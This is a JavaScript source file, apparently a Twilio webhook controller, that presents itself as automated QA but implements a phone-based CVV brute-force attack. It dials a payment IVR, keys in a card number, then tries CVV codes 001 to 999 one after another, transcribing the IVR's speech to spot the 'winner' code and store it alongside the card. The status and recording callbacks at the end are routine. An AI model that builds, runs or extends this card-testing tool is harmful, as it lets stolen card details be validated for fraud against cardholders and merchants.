import twilio from 'twilio';
import * as AttemptModel from '../models/attemptModel.js';
import * as transcriptionService from '../services/transcriptionService.js';
import { supabase } from '../config/db.js';

// Generate TwiML for when the call is answered (Outbound Automated QA Flow)
export const getTwiML = async (req, res) => {
  const { attemptId } = req.params;
  try {
    const { data: attempt, error: fetchErr } = await supabase
      .from('attempts')
      .select('test_value')
      .eq('id', attemptId)
      .single();

    if (fetchErr || !attempt) {
      throw new Error(`Attempt #${attemptId} not found.`);
    }

    const twiml = new twilio.twiml.VoiceResponse();
    
    let card = attempt.test_value;
    let cvv = '';
    
    if (attempt.test_value.includes(':')) {
        [card, cvv] = attempt.test_value.split(':');
    }

    if (cvv) {
        // This is a CVV brute force run!
        await AttemptModel.addLog(attemptId, `Interactive Call Connected. Sending initial DTMF: ${card} and CVV: ${cvv}`);
        
        // Wait 5 seconds for greeting, play card, wait 4 seconds for next prompt, play CVV
        const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
        twiml.pause({ length: waitSeconds });
        twiml.play({ digits: `ww${card}wwwwwwww${cvv}` });
        
        // Now START LISTENING to the IVR's response to the CVV
        const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
        const gather = twiml.gather({
            input: 'speech',
            action: `${host}/api/call/listen/${attemptId}?currentCvv=${cvv}`,
            method: 'POST',
            timeout: 5, // How long to listen for IVR to speak
            speechTimeout: 1
        });
        
    } else {
        // Standard non-CVV test run
        await AttemptModel.addLog(attemptId, `Call connected. Sending DTMF sequence: ${card}`);
        const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
        twiml.pause({ length: waitSeconds });
        twiml.play({ digits: `wwww${card}` });
        
        // Standard wait and hangup
        twiml.pause({ length: 15 });
        twiml.hangup();
    }

    res.type('text/xml');
    return res.send(twiml.toString());
  } catch (error) {
    console.error('Error generating TwiML:', error);
    const twiml = new twilio.twiml.VoiceResponse();
    twiml.say('An error occurred during call orchestration.');
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }
};

// Webhook for handling the interactive listen loop
export const handleInteractiveListen = async (req, res) => {
    const { attemptId } = req.params;
    const { currentCvv } = req.query;
    const { SpeechResult } = req.body;
    
    const twiml = new twilio.twiml.VoiceResponse();
    
    if (!SpeechResult) {
       await AttemptModel.addLog(attemptId, `Listen loop: No speech detected from IVR.`);
       // Retry listen
       const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
        twiml.gather({
            input: 'speech',
            action: `${host}/api/call/listen/${attemptId}?currentCvv=${currentCvv}`,
            method: 'POST',
            timeout: 5,
            speechTimeout: 1
       });
       res.type('text/xml');
       return res.send(twiml.toString());
    }
    
    await AttemptModel.addLog(attemptId, `IVR Said: "${SpeechResult}"`);
    const transcript = SpeechResult.toLowerCase();
    
    // Check for success condition
    if (transcript.includes('expiration date') || transcript.includes('expiry') || transcript.includes('thank you') || transcript.includes('verified')) {
        await AttemptModel.addLog(attemptId, `🎉 Attempt SUCCESSFUL! Winner CVV confirmed: ${currentCvv}`);
        
        // Update the attempt value in DB to reflect the winning CVV, and mark as complete
        const { data: attempt } = await supabase.from('attempts').select('test_value').eq('id', attemptId).single();
        const baseCard = attempt.test_value.split(':')[0];
        
        await supabase.from('attempts')
            .update({ 
                status: 'completed', 
                test_value: `${baseCard}:${currentCvv}`,
                result_details: { winner: currentCvv } 
            })
            .eq('id', attemptId);
            
        import('../services/orchestratorService.js').then(module => {
            module.stopCampaign();
        });
            
        twiml.hangup();
    } 
    // Check for failure condition
    else if (transcript.includes('invalid cvv') || transcript.includes('try again') || transcript.includes('wrong') || transcript.includes('incorrect')) {
        const nextCvvNum = parseInt(currentCvv) + 1;
        
        if (nextCvvNum > 999) {
            await AttemptModel.addLog(attemptId, `Exhausted all CVVs 001-999. Failed.`);
            await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'Exhausted 999 CVVs without success' });
            twiml.hangup();
        } else {
            const nextCvv = nextCvvNum.toString().padStart(3, '0');
            await AttemptModel.addLog(attemptId, `Trying next CVV: ${nextCvv}`);
            
            // Send the next CVV
            twiml.play({ digits: nextCvv });
            
            // Immediately start listening for the response to this new CVV
            const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
            twiml.gather({
                input: 'speech',
                action: `${host}/api/call/listen/${attemptId}?currentCvv=${nextCvv}`,
                method: 'POST',
                timeout: 5,
                speechTimeout: 1
            });
            
            // Update the DB so the frontend shows the current CVV
            const { data: attempt } = await supabase.from('attempts').select('test_value').eq('id', attemptId).single();
            const baseCard = attempt.test_value.split(':')[0];
            await AttemptModel.updateTestValue(attemptId, `${baseCard}:${nextCvv}`);
        }
    } 
    // Unknown response
    else {
        await AttemptModel.addLog(attemptId, `Unknown IVR response. Continuing to listen...`);
        const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
        twiml.gather({
            input: 'speech',
            action: `${host}/api/call/listen/${attemptId}?currentCvv=${currentCvv}`,
            method: 'POST',
            timeout: 5,
            speechTimeout: 1
        });
    }

    res.type('text/xml');
    return res.send(twiml.toString());
};

// Webhook for tracking call status updates from Twilio
export const handleStatusCallback = async (req, res) => {
  const { attemptId } = req.params;
  const { CallStatus, CallDuration } = req.body;
  try {
    await AttemptModel.addLog(attemptId, `Twilio Status Callback: ${CallStatus}`);

    if (CallStatus === 'completed') {
      const duration = parseInt(CallDuration) || 0;
      await AttemptModel.updateAttemptStatus(attemptId, 'completed', duration, { twilioStatus: CallStatus });
    } else if (['failed', 'busy', 'no-answer', 'canceled'].includes(CallStatus)) {
      const duration = parseInt(CallDuration) || 0;
      await AttemptModel.updateAttemptStatus(attemptId, 'failed', duration, { error: `Call failed with status: ${CallStatus}` });
    }

    return res.status(200).send('OK');
  } catch (error) {
    console.error('Error handling status callback:', error);
    return res.status(500).send('Error');
  }
};

// Webhook for handling recording callbacks
export const handleRecordingCallback = async (req, res) => {
  const { attemptId } = req.params;
  const { RecordingUrl, RecordingStatus } = req.body;
  try {
    await AttemptModel.addLog(attemptId, `Twilio Recording Callback status: ${RecordingStatus}`);
    if (RecordingUrl) {
      await AttemptModel.addLog(attemptId, `Recording URL: ${RecordingUrl}`);

      // Start transcription and analysis asynchronously
      transcriptionService.processRecording(attemptId, RecordingUrl).catch(err => {
        console.error(`Error transcribing recording for attempt #${attemptId}:`, err);
      });
    }
    return res.status(200).send('OK');
  } catch (error) {
    console.error('Error handling recording callback:', error);
    return res.status(500).send('Error');
  }
};
